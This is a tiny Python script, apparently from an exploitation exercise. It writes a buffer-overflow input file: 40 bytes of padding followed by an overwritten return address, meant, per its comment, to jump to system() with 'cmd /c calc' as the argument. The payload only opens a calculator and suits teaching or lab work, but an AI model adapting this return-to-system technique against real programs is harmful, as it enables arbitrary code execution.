#encoding: utf-8
## jump to the system() function with cmd /c calc as argument


padding = "A" * 40
 
input = padding + "\x45\x44\x43\x42" 

with open("input.txt", "wb") as file:
	file.write(input.encode('latin_1'))
